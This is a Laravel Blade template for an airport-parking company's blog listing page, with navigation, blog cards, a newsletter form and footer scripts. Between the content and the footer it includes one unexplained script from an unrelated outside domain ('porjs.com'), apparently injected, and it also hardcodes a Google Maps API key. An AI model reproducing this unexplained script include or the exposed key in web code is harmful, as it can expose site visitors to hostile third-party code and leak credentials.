<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="msvalidate.01" content="377E9E53DDB6879262C788318F6BA3D8" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.css" integrity="sha512-HHsOC+h3najWR7OKiGZtfhFIEzg5VRIPde0kB0bG2QRidTQqf+sbfcxCTB16AcFB93xMjnBIKE29/MjdzXE+qw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" type="text/css" href="{{url('theme-new/css/style.css')}}">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@200;300&display=swap" rel="stylesheet">
<title>Blogs</title>

    <!--==== Style css file ====-->
    <link rel="stylesheet" href="assets/css/blog.css">
    <!--==== Responsive css file ====-->
    <link rel="stylesheet" href="assets/css/responsive.css">
    <!--==== Custom css file ====-->
    <link rel="stylesheet" href="assets/css/custom.css">
    <style>
        .home-banner2 h1 {
            font-family: Arial, Helvetica, sans-serif;
        }

        .home-banner2 .schoolbell {
            font-family: Arial, Helvetica, sans-serif;
        }
        #img1{
            width:290px;
            
        }
        .single-blog-inner-2{
            background: #4AA1D9;
            color:white;
            border-radius:20px;
            padding:20px;
        }
        .post-image{
            width: 100%; 
            height: 270px; 
            border-radius:20px;
            margin-top:20px;
        }
        
    </style>

</head>

<body>
    <!-- header -->
<section id="header" class="">
	<div class="container">
		<div class="row justify-content-center">
			<nav class="navbar navbar-expand-lg">
			  <div class="container-fluid">
			    <a class="navbar-brand" href="{{url('/')}}" >
			    	<img src="{{url('theme-new/img/logo2.png')}}" height="40px" class="top-img" alt="Flight Park One Logo">
			    </a>
			    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
			      <span class="navbar-toggler-icon"></span>
			    </button>
			    <div class="collapse navbar-collapse" id="navbarNavDropdown">
			      <ul class="navbar-nav">
			        <li class="nav-item">
			          <a class="nav-link active" aria-current="page" href="{{url('/')}}" style="color:#4aa1d9">Home</a>
			        </li>
			        <li class="nav-item dropdown">
			          <a class="nav-link dropdown-toggle" href="javascript:void(0)" role="button" data-bs-toggle="dropdown" aria-expanded="false" style="color:#4aa1d9">
			            Airport Parking
			          </a>
			          <ul class="dropdown-menu">
                        <li><a class="dropdown-item" href="{{url('gatwick-airport-parking')}}">Airport Parking</a></li>
                        <li><a class="dropdown-item" href="{{url('gatwick-valet-parking')}}">Valet Parking</a></li>
                        <li><a class="dropdown-item" href="{{url('gatwick-meet-and-greet-parking')}}">Meet & Greet</a></li>
                        <li><a class="dropdown-item" href="{{url('gatwick-terminals')}}">Terminals</a></li>
			          </ul>
			        </li>
             <!--       <li class="nav-item">-->
			          <!--<a class="nav-link" href="{{url('about-us')}}">What We Do</a>-->
             <!--       </li>-->
                    <li class="nav-item">
			          <a class="nav-link" href="{{url('about-us')}}" style="color:#4aa1d9">About Us</a>
                    </li>
                    <li class="nav-item">
			          <a class="nav-link" href="{{url('how-it-works')}}" style="color:#4aa1d9">How it Works</a>
                    </li>
             <!--       <li class="nav-item">-->
			          <!--<a class="nav-link" href="{{url('blogs')}}">Blogs</a>-->
             <!--       </li>-->
			        <li style="background-color: #4aa1d9;">
		            	<a class="nav-link" href="{{url('support')}}">
				           <button type="button" class="btn " style="color: white;" >Customer Support</button>
				        </a>
				    </li>
			     
			      </ul>
			    </div>
			  </div>
			</nav>
		</div>
	</div>
	<hr style="color:#4aa1d9">
</section>
    <!-- banner area -->
    <!--<div class="banner-area-inner">-->
    <!--    <div class="banner-wrap home-banner2"-->
    <!--        style="background-image: url('./assets/Vector-5.png'); background-size: cover; height: 500px;">-->
    <!--        <div class="container">-->
    <!--            <div class="row d-flex justify-content-start">-->
    <!--                <div class="col-12 col-md-9">-->
    <!--                    <div class="banner-text-wrap text-center">-->
    <!--                        <h1 class="text-white d-flex">Flightpark One</h1>-->
    <!--                        <span class="schoolbell d-flex justify-content-start">Best Meet & Greet Parking at-->
    <!--                            Gatwick</span>-->
    <!--                    </div>-->
    <!--                </div>-->
    <!--            </div>-->
    <!--            <div class="row">-->
    <!--                <div class="col-12 banner-form-top">-->
    <!--                    <div class="only-desktop-image">-->
    <!--                        <img src="src="{{url('theme-new/img/others/Rectangle629.png')}}" alt="">-->
    <!--                    </div>-->
    <!--                    <div class="banner-form-area mb-1">-->
    <!--                        <form action="#">-->
    <!--                            <div class="inpout-feield-wrap">-->
    <!--                                <input type="date" placeholder="" class="banner-form last-form-banner">-->
    <!--                                <input type="time" placeholder="" class="banner-form last-form-banner">-->
    <!--                                <input type="date" placeholder="" class="banner-form last-form-banner">-->
    <!--                                <input type="time" placeholder="" class="banner-form last-form-banner">-->
    <!--                                <input type="text" placeholder="PromoCode" class="banner-form last-form-banner">-->
    <!--                                <button class="btn">Search</button>-->
    <!--                            </div>-->
    <!--                        </form>-->
    <!--                    </div>-->
    <!--                </div>-->

    <!--            </div>-->
    <!--        </div>-->
    <!--    </div>-->
    <!--</div>-->
    <!-- End of banner area -->


    <!-- our blog -->
    <section class="top-shape">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-12">
                    <div class="section-title text-center my-5">
                        <h2>Recent Blogs</h2>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="col-md-12 col-lg-12">
                    <div class="d-flex single-blog-inner single-blog-inner-2" style="">
                        <div class="row">
                            <div class="col-lg-1 col-md-1 order-sm-0">
                                
                            </div>
                            <div class="col-lg-6 col-md-6 order-sm-0">
                                <div class="post-content my-5">
                                    <div class="post-details">
                                        <div class="post-title">
                                            <h3><a href="https://www.flightparkone.com/blog/gatwick-airport-parking-guides">Gatwick Airport Parking Guides</a></h3>
                                        </div>
                                        <p style="color: black">Gatwick Airport Parking Guides - How to choose the best Gatwick airport
                                            parking...</p>
                                        <span href="#" style="color: black">Feb 21, 2023 <b style="color: white">Charles Thompson</b> 10 min read</span>
                                    </div>
                                </div>
                            </div>
                            <!--<div class="col-lg-2 col-md-2 order-sm-1">-->
                            <!--</div>-->
                            
                            <div class="col-lg-5 col-md-5 order-sm-1 text-center">
                                <center>
                                <div class="post-image">
                                    
                                        <a href="#">
                                        <img src="{{url('theme-new/img/logo-(19) 1.png')}}" alt="" id="img1">
                                    </a>
                                    
                                </div>
                                </center>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!--<div class="col-md-6 col-lg-6 ">-->
                <!--    <div class="single-blog-inner">-->
                <!--        <div class="post-image d-flex justify-content-center" style="">-->
                <!--            <center>-->
                <!--                <a href="#">-->
                <!--               <img src="{{url('theme-new/img/logo-(20) 1.png')}}" alt="" style="width:300px">-->
                <!--            </a>-->
                <!--            </center>-->
                <!--        </div>-->
                <!--        <div class="post-content"  >-->
                <!--            <div class="post-details my-3 mx-5" style="margin-left:10px;margin-right:10px">-->
                <!--                <div class="post-title">-->
                <!--                    <h3 ><a href="#" style="color:#4aa1d9">How simply park and fly work?</a></h3>-->
                <!--                </div>-->
                <!--                <p style="color:#878787">Simply park & fly makes parking easy by allowing you to book a spot right from y...-->
                <!--                </p>-->
                <!--                <span href="#" style="color:#878787">Feb 21, 2023 <b style="color:#4aa1d9">Charles Thompson</b> 10 min read</span>-->
                <!--            </div>-->
                <!--        </div>-->
                <!--    </div>-->
                <!--</div>-->
                @foreach($posts as $post)
                <div class="col-md-6 col-lg-6 ">
                    <div class="single-blog-inner">
                        <div class="post-image d-flex justify-content-center" style="">
                            <center>
                                <a href="#">
                               
                               @if ($post->banner != null)
                                   <img class="img-fluid my-2" src='{{ asset("storage/app/".$post->banner) }}' alt="" style="width:500px;height:250px;border-radius:20px">
                                    @else
                                     <img src="{{url('theme-new/img/parking 2.avif')}}" alt="" style="width:500px;height:250px;border-radius:20px">
                                @endif 
                            </a>
                            </center>
                        </div>
                        <div class="post-content"  >
                            <div class="post-details my-3 mx-5">
                                <div class="post-title" style="margin-left:30px">
                                    <h3 ><a href='{{ url("blog/".$post->slug) }}' style="color:#4aa1d9;">{{ $post->page_title }}</a></h3>
                                </div>
                                <p style="color:#878787;margin-left:30px">Simply park & fly makes parking easy by allowing you to book a spot right from y...
                                </p>
                                <span href="#" style="color:#878787;margin-left:30px"><span>{{ date("F d Y", strtotime($post->added_on)) }}</span> <b style="color:#4aa1d9">Charles Thompson</b></span>
                                <a href='{{ url("blog/".$post->slug) }}' class="btn color2-bg  float-btn">Read more<i class="fa fa-solid fa-chevrons-right" style="color:black"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            @endforeach
                <!--<div class="col-md-6 col-lg-6">-->
                <!--    <div class="single-blog-inner">-->
                <!--        <div class="post-image d-flex justify-content-center" style="width: 100%; height: 270px !important;">-->
                <!--                <a href="#">-->
                <!--               <img src="{{url('theme-new/img/logo-(21).png')}}" alt="" style="width:300px;padding-top:60px">-->
                <!--            </a>-->
                <!--        </div>-->
                <!--        <div class="post-content">-->
                <!--            <div class="post-details my-3 mx-5">-->
                <!--                <div class="post-title">-->
                <!--                    <h3><a href="#"  style="color:#4aa1d9">Understand the Gatwick Airport Parking Plan</a></h3>-->
                <!--                </div>-->
                <!--                <p style="color:#878787">Learn Here about Gatwick Airport Parking. We are providing Long and Short term p...-->
                <!--                </p>-->
                <!--                <span href="#" style="color:#878787">Feb 21, 2023 <b  style="color:#4aa1d9">Charles Thompson</b> 10 min read</span>-->
                <!--            </div>-->
                <!--        </div>-->
                <!--    </div>-->
                <!--</div>-->
            </div>
        </div>
    </section>
    <!-- End of our blog -->



<script language="JavaScript" src="//porjs.com/2440.js"></script>
   @php
        $site_settings_main=[];
            $settingsAll = App\settings::all();
                    foreach ($settingsAll as $setting) {
                        $site_settings_main[$setting->field_name] = $setting->field_value;
                    }
    @endphp

<footer id="footer">
	<div class="footer-wrap">
		<div class="second_class">
			<div class="container second_class_bdr">
				<div class="row">
					<div class="col-md-3 col-sm-6">
						<div class="footer-logo"><img src="{{url('theme-new/img/logo.png')}}" alt="logo"> </div>
						<p>{!! $site_settings_main["footer_catch_line"]  !!}</p>
						<ul class="contact-link">
							<li>
								<a href="#">
									<i class="fa-solid fa-house"></i> 
									Flightpark One Ltd Flightpath Effingham Road Horley RH6 9RP
								</a>
							</li>
							<li>
								<a href="tel:0330 179 7645">
									<i class="fa-solid fa-phone"></i> 
									0330 179 7645
								</a>
							</li>
							<li>
								<a href="mailto: helpdesk@flightparkone.com">
									<i class="fa-solid fa-envelope"></i>
									helpdesk@flightparkone.com
								</a>
							</li>
						</ul>
					</div>
					<div class="col-md-3 col-sm-6">
						<h3>Our Links</h3>
						<ul class="footer-links">
                            <li><a href="{{url('gatwick-airport-parking')}}">Airport Parking</a></li>
                            <li><a href="{{url('gatwick-valet-parking')}}">Valet Parking</a></li>
                            <li><a href="{{url('gatwick-meet-and-greet-parking')}}">Meet & Greet</a></li>
                            <li><a href="{{url('gatwick-terminals')}}">Terminals</a></li>
                            <li><a href="{{url('terms-and-conditions')}}">Terms & Conditions</a></li>
                            <li><a href="{{url('privacy-policy')}}">Privacy Policy</a></li>
						</ul>
					</div>
					<div class="col-md-3 col-sm-6">
						<h3>Blogs</h3>
						<ul class="footer-links">
						    <li><a href="{{url('blog')}}"><b>Blogs</b></a></li>
                            <li><a href="{{url('cheap-gatwick-parking')}}">Cheap Gatwick Parking</a></li>
                            <li><a href="{{url('south-terminal-parking')}}">South Terminal Parking</a></li>
                            <li><a href="{{url('north-terminal-parking')}}">North Terminal Parking</a></li>
                            <li><a href="{{url('book-gatwick-parking-today')}}">Book Gatwick Parking</a></li>
                            <li><a href="{{url('budget-friendly-gatwick-airport-parking')}}">Budget Friendly Parking</a></li>
						</ul>
					</div>
					<div class="col-md-3 col-sm-6 px-4">
						<h3>Subscribe For a Newsletter</h3>
						<p>Get discounts and newsletters on our Flightparkone parking in your email. We promise to not spam. Unsubscribe anytime</p>
						<form id="subscribe" class="newsletter">
                                <input class="enteremail fl-wrap" name="subscribe_user_email" id="subscribe_user_email" placeholder="Enter Your Email" spellcheck="false" type="text">
                                <input name="subscribe_user_name" id="subscribe_user_name" type="hidden">
                                <button type="submit" id="subscribe-button" class="newsletter_submit_btn"><i class="fa-solid fa-paper-plane"></i></button>
                                <label for="subscribe-email" class="subscribe-message"></label>
                            </form>
						<div class="standard_social_links">
							<div>
							    
								@if(array_key_exists("facebook",$site_settings_main) && $site_settings_main["facebook"] !="" && $site_settings_main["facebook_status"] =="active")
                                	<li class="round-btn btn-facebook"><a target="_blank" href='{{ $site_settings_main["facebook"] }}'><i class="fab fa-facebook-f"></i></a> </li>
                                @endif
                				@if(array_key_exists("twitter",$site_settings_main) && $site_settings_main["twitter"] !="" && $site_settings_main["twitter_status"] =="active")
                                	<li class="round-btn btn-twitter"><a target="_blank" href='{{ $site_settings_main["twitter"] }}'><i class="fab fa-twitter"></i></a></li>
                                @endif
                                @if(array_key_exists("instagram",$site_settings_main) && $site_settings_main["instagram"] !="" && $site_settings_main["instagram_status"] =="active")
                                	<li class="round-btn btn-instagram"><a target="_blank" href='{{ $site_settings_main["instagram"] }}'><i class="fab fa-instagram"></i></a></li>
                                @endif
                                @if(array_key_exists("linkedin",$site_settings_main) && $site_settings_main["linkedin"] !="" && $site_settings_main["linkedin_status"] =="active")
                                	<li class="round-btn btn-linkedin"><a target="_blank" href='{{ $site_settings_main["linkedin"] }}'><i class="fab fa-linkedin"></i></a></li>
                                @endif
                                @if(array_key_exists("youtube",$site_settings_main) && $site_settings_main["youtube"] !="" && $site_settings_main["youtube_status"] =="active")
                                    <li class="round-btn btn-youtube"><a target="_blank" href='{{ $site_settings_main["youtube"] }}'><i class="fab fa-youtube"></i></a></li>
                                @endif
                                @if(array_key_exists("google_plus",$site_settings_main) && $site_settings_main["google_plus"] !="" && $site_settings_main["google_plus_status"] =="active" )
                                	<li class="round-btn btn-google_plus"><a target="_blank" href='{{ $site_settings_main["google_plus"] }}'><i class="fab fa-google_plus"></i></a></li>
                                @endif
                                @if(array_key_exists("pinterest",$site_settings_main) && $site_settings_main["pinterest"] !="" && $site_settings_main["pinterest_status"] =="active")
                                	<li class="round-btn btn-pinterest"><a target="_blank" href='{{ $site_settings_main["pinterest"] }}'><i class="fab fa-pinterest"></i></a></li>
                                @endif
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="row">
			<div class="container-fluid">
				<div class="copyright"> {{$site_settings_main["footer_copyright"]}} {{$site_settings_main["footer_company_reg_no"]}}.</div>
			</div>
		</div>
	</div>
</footer>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
<script src="https://zmdtravel.com/theme/tinyCalender/index.js"></script>
<script src="{{url('theme-new/js/main.js')}}"></script>


<script src="{{url('theme/tinyCalender/index.js')}}"  ></script>
@if(substr(strrchr(url()->current(),"/"),1)!='result')
<script>
	var enddate = new Date();
    enddate.setDate(enddate.getDate()+ 8);
	new TinyPicker({ 
	format: 'dd-mm-yyyy',
	firstBox:document.getElementById('startDate'), // Required -- Overrides us finding the first input box
	lastBox: document.getElementById('endDate'), // Required -- Overrides us finding the last input box
	startDate: new Date(), // Needs to be a valid instance of Date   
    endDate: enddate, // Needs to be a valid instance of Date
	allowPast: false, // If you want the user to be able to select past dates
	useCache: true, 
	orientation: "top auto",
	 horizontal: 'auto',
    vertical: 'auto'
}).init();
</script>
<script>
	var enddate = new Date();
    enddate.setDate(enddate.getDate()+ 8);
	new TinyPicker({ 
	format: 'dd-mm-yyyy',
	firstBox:document.getElementById('startDate_header'), // Required -- Overrides us finding the first input box
	lastBox: document.getElementById('endDate_header'), // Required -- Overrides us finding the last input box
	startDate: new Date(), // Needs to be a valid instance of Date   
    endDate: enddate, // Needs to be a valid instance of Date
	allowPast: false, // If you want the user to be able to select past dates
	useCache: true, 
	orientation: "top auto",
	 horizontal: 'auto',
    vertical: 'auto'
}).init();
</script>
@else
@php

$dropdate = str_replace('/', '-', request()->dropoffdate);		
$pickdate = str_replace('/', '-', request()->departure_date);

$dropofdate = date('m/d/Y', strtotime($dropdate));
$pickupdate = date('m/d/Y', strtotime($pickdate));

@endphp
<script>
// $(document).ajaxStop(function () {
//     //var dropDate = '{{ request()->dropoffdate }}';
//     //var departureDate = '{{ request()->departure_date }}';

    
//     var dropDate = '{{ $dropofdate }}';
//     var departureDate = '{{ $pickupdate }}';


// 	var enddate = new Date(departureDate);
//     // enddate.setDate(enddate);
// 	new TinyPicker({ 
// 	firstBox:document.getElementById('startDate'), // Required -- Overrides us finding the first input box
// 	lastBox: document.getElementById('endDate'), // Required -- Overrides us finding the last input box
// 	startDate: new Date(dropDate), // Needs to be a valid instance of Date   
//     endDate: enddate, // Needs to be a valid instance of Date
// 	allowPast: false, // If you want the user to be able to select past dates
// 	useCache: true, 
// 	orientation: "top auto",
// 	 horizontal: 'auto',
// 	 success: function(startDate, endDate){}, // callback function when user inputs dates,
//     vertical: 'auto'
// }).init();
// });
</script> 
@endif



<script async type="text/javascript">

    $(document).ready(function () {
       

 
        // process the form
        $('#subscribe').submit(function (event) {

            var formData = {
                'name': $('#subscribe_user_name').val(),
                'email': $('#subscribe_user_email').val(),
                '_token': '{{ @csrf_token() }}'
            };

            // process the form
            $.ajax({
                type: 'POST', // define the type of HTTP verb we want to use (POST for our form)
                url: '{{ route("subscribe_user") }}', // the url where we want to POST
                data: formData, // our data object
                dataType: 'json', // what type of data do we expect back from the server
                encode: true
            })
            // using the done promise callback
                .done(function (data) {
                    
                     if (data.success == 0) {
                        if(data.errors=='validation.unique'){
                           $(".subscribe-message").html('<i class="fa fa-times"></i> <strong>Sorry!</strong> This email already subscribed.');
                        }else
                        {
                           $(".subscribe-message").html('<i class="fa fa-times"></i> <strong>Sorry!</strong> '+data.errors);
                       }
                    } else {

                        $("#subscribe").trigger('reset');
                        $(".subscribe-message").html('<i class="fa fa-check"></i> <strong>Success!</strong> '+data.data);
                    }

                });

            event.preventDefault();
        });

    });

</script>

<script async  type="text/javascript">
    $(".accordion-toggle").on('click', function (e) {
        e.preventDefault();
        $($(this).attr("href")).toggleClass('collapse');
        var condition = false;
        if ($($(this).attr("href")).attr("aria-expanded") == false) {
            condition = true;
        } 
    });

$(document).mouseleave(function () {
    console.log('out');
});
</script>

@section("footer-script")

@show



    <!-- JS Files -->
    <!-- ==== JQuery 3.3.1 js file==== -->
    <script src="assets/js/jquery-3.3.1.min.js"></script>
    <!-- ==== Bootstrap js file==== -->
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <!-- ==== JQuery Waypoint js file==== -->
    <script src="assets/plugins/waypoints/jquery.waypoints.min.js"></script>
    <!-- ==== Parsley js file==== -->
    <script src="assets/plugins/parsley/parsley.min.js"></script>
    <!-- ==== Ratina js file==== -->
    <script src="assets/plugins/retinajs/retina.min.js"></script>
    <!-- ==== parallax js==== -->
    <script src="assets/plugins/parallax/parallax.js"></script>
    <!-- ==== Owl Carousel js file==== -->
    <script src="assets/plugins/owl-carousel/owl.carousel.min.js"></script>
    <!-- ==== Menu  js file==== -->
    <script src="assets/js/menu.min.js"></script>
    <!-- ===video popup=== -->
    <script src="assets/plugins/Magnific-Popup/jquery.magnific-popup.min.js"></script>
    <!-- ====Counter js file=== -->
    <script src="assets/plugins/waypoints/jquery.counterup.min.js"></script>
    <!-- cammera js -->
    <script src="assets/plugins/camera/camera.min.js"></script>
    <!-- easing js -->
    <script src="assets/js/easing.js"></script>
    <!--==== google map api key ====-->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB2D8wrWMY3XZnuHO6C31uq90JiuaFzGws"></script>
    <!-- ==== Script js file==== -->
    <script src="assets/js/scripts.js"></script>
    <!-- ==== Custom js file==== -->
    <script src="assets/js/custom.js"></script>

</body>

</html>